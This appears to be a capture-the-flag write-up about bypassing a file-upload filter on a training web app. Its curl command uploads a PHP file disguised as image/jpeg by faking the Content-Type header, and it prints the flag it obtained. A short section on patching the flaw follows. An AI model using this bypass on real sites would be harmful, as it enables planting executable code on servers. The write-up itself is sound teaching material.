# Exploit
We visit the url "/index.php?page=upload". We can upload "jpeg" file on this page. I tried to upload a "php" file but this don't work. When we upload a php file, our browser send in the HTTP headers the "content-type" which is "application/octet-stream" for a php file and "image/jpeg" for a jpeg file.

If we modify the content-type in the headers, the upload work, the WAF seems to verify only the content-type. I used Burp Suite to intercept the HTTP request and modify it but you can also do it by using the curl "-F" flag:

```bash
echo '<?php echo "I am bad" ?>' > /tmp/bad.php && curl -X POST -F "Upload=Upload" -F "uploaded=@/tmp/bad.php;type=image/jpeg" "http://x.x.x.x/index.php?page=upload" | grep 'The flag is :'
```

We get the flag **46910d9ce35b385885a9f7e2b336249d622f29b267a1771fbacf52133beddba8**

# Patch
As always, never trust user input. You shouldn't only verify the "content-type" header. For example, you should:
+ apply a whitelist filter for filename and rename it
+ detect and block file types not accepted
+ verify the filesize
+ check the permission of the file